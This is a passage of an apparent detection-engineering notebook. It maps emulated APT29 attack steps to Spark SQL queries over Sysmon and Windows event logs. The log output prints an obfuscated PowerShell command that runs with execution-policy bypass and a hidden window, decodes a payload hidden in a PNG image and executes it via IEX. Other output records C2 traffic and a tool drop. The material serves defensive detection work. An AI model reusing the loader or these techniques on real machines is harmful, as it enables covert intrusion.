<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 5156</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2976
	Application Name:	\device\harddiskvolume2\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.4
	Source Port:		59846
	Destination Address:	192.168.0.5
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	68659
	Layer Name:		Connect
	Layer Run-Time ID:	48 
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2976
	Application Name:	\device\harddiskvolume2\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.4
	Source Port:		59845
	Destination Address:	192.168.0.5
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	68659
	Layer Name:		Connect
	Layer Run-Time ID:	48 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-4-standard-application-layer-protocol">
<h2>3.B.4. Standard Application Layer Protocol<a class="headerlink" href="#b-4-standard-application-layer-protocol" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Used HTTPS to transport C2 (192.168.0.5) traffic</p>
<p><strong>Criteria:</strong> Evidence that the network data sent over the C2 channel is HTTPS</p>
<div class="section" id="id15">
<h3>Detection Type:None(None)<a class="headerlink" href="#id15" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="b-5-standard-cryptographic-protocol">
<h2>3.B.5. Standard Cryptographic Protocol<a class="headerlink" href="#b-5-standard-cryptographic-protocol" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Used HTTPS to encrypt C2 (192.168.0.5) traffic</p>
<p><strong>Criteria:</strong> Evidence that the network data sent over the C2 channel is encrypted</p>
<div class="section" id="id16">
<h3>Detection Type:None(None)<a class="headerlink" href="#id16" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="c-1-modify-registry">
<h2>3.C.1. Modify Registry<a class="headerlink" href="#c-1-modify-registry" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Modified the Registry to remove artifacts of COM hijacking</p>
<p><strong>Criteria:</strong> Deletion of of the HKCU\Software\Classes\Folder\shell\Open\command subkey</p>
<div class="section" id="id17">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id17" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:22A46621-7A92-48C1-81BF-B3937EB4FDC3</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT b.ProcessGuid</span>
<span class="sd">    FROM apt29Host b</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(ParentImage) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>
<span class="sd">    ) a</span>
<span class="sd">    ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">    WHERE b.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND b.EventID = 1</span>
<span class="sd">) c</span>
<span class="sd">ON d.ProcessGuid = c.ProcessGuid</span>
<span class="sd">WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND d.EventID = 12</span>
<span class="sd">  AND LOWER(d.TargetObject) RLIKE &#39;.*\\\\\\\\folder\\\\\\\\shell\\\\\\\\open\\\\\\\\command.*&#39;</span>
<span class="sd">  AND d.Message RLIKE &#39;.*EventType: DeleteKey.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry object added or deleted:
RuleName: -
EventType: DeleteKey
UtcTime: 2020-05-02 02:59:15.911
ProcessGuid: {47ab858c-e1f8-5eac-bc03-000000000400}
ProcessId: 3832
Image: C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\Folder\shell\open\command 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="id18">
<h2>4.A.1. Remote File Copy<a class="headerlink" href="#id18" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Dropped additional tools (SysinternalsSuite.zip) to disk over C2 channel (192.168.0.5)</p>
<p><strong>Criteria:</strong> powershell.exe creating the file SysinternalsSuite.zip</p>
<div class="section" id="id19">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id19" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:337EA65D-55A7-4890-BB2A-6A08BB9703E2</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT b.ProcessGuid</span>
<span class="sd">    FROM apt29Host b</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(ParentImage) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>
<span class="sd">    ) a</span>
<span class="sd">    ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">    WHERE b.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND b.EventID = 1</span>
<span class="sd">) c</span>
<span class="sd">ON d.ProcessGuid = c.ProcessGuid</span>
<span class="sd">WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND d.EventID = 11</span>
<span class="sd">  AND LOWER(d.TargetFilename) LIKE &#39;%.zip&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 02:56:18.032
ProcessGuid: {47ab858c-e14e-5eac-ac03-000000000400}
ProcessId: 5944
Image: C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\pbeesly\AppData\Roaming\Draft.Zip
CreationUtcTime: 2020-05-02 02:56:18.032 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-2-powershell">
<h2>4.A.2. PowerShell<a class="headerlink" href="#a-2-powershell" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Spawned interactive powershell.exe</p>
<p><strong>Criteria:</strong> powershell.exe spawning from powershell.exe</p>
<div class="section" id="id20">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id20" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:B86F90BD-716C-4432-AE97-901174F111A8</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">) c</span>
<span class="sd">ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:05:24.771
ProcessGuid: {47ab858c-e374-5eac-d803-000000000400}
ProcessId: 3852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
ParentProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
ParentProcessId: 2976
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: &quot;PowerShell.exe&quot; -noni -noexit -ep bypass -window hidden -c &quot;sal a New-Object;Add-Type -AssemblyName &#39;System.Drawing&#39;; $g=a System.Drawing.Bitmap(&#39;C:\Users\pbeesly\Downloads\monkey.png&#39;);$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))&quot; 
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:00:13.551
ProcessGuid: {47ab858c-e23d-5eac-c603-000000000400}
ProcessId: 3876
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
ParentProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
ParentProcessId: 2976
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: &quot;PowerShell.exe&quot; -noni -noexit -ep bypass -window hidden -c &quot;sal a New-Object;Add-Type -AssemblyName &#39;System.Drawing&#39;; $g=a System.Drawing.Bitmap(&#39;C:\Users\pbeesly\Downloads\monkey.png&#39;);$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))&quot; 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:FA520225-1813-4EF2-BA58-98CB59C897D7</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">) c</span>
<span class="sd">ON d.ProcessId = c.NewProcessId</span>
<span class="sd">WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xf0c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0xba0
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	powershell.exe

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
-RECORD 1--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xf24
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0xba0
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	powershell.exe

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-3-deobfuscate-decode-files-or-information">
<h2>4.A.3. Deobfuscate/Decode Files or Information<a class="headerlink" href="#a-3-deobfuscate-decode-files-or-information" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Decompressed ZIP (SysinternalsSuite.zip) file using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing Expand-Archive</p>
<div class="section" id="id21">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id21" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:66B068A4-C3AB-4973-AE07-2C15AFF78104</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Payload</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND f.EventID = 4103</span>
<span class="sd">    AND LOWER(f.Payload) LIKE &quot;%expand-archive%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Expand-Archive): &quot;Expand-Archive&quot;
ParameterBinding(Expand-Archive): name=&quot;LiteralPath&quot;; value=&quot;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&quot;
ParameterBinding(Expand-Archive): name=&quot;DestinationPath&quot;; value=&quot;C:\Users\pbeesly\Downloads\&quot;
ParameterBinding(Expand-Archive): name=&quot;Path&quot;; value=&quot;&quot;
ParameterBinding(Expand-Archive): name=&quot;Force&quot;; value=&quot;False&quot;
                                                                                                                                                                                                                                     
-RECORD 1-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Completed&quot;; value=&quot;True&quot;
                                                                                                                                                                                                                                                                                                                                                                                                                               
-RECORD 2-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;308&quot;
 
-RECORD 3-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;100&quot;
                                                                                                                                                                                                                                                                
-RECORD 4-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;307&quot;
 
-RECORD 5-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;100&quot;
                                                                                                                                                                                                                                                                
-RECORD 6-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
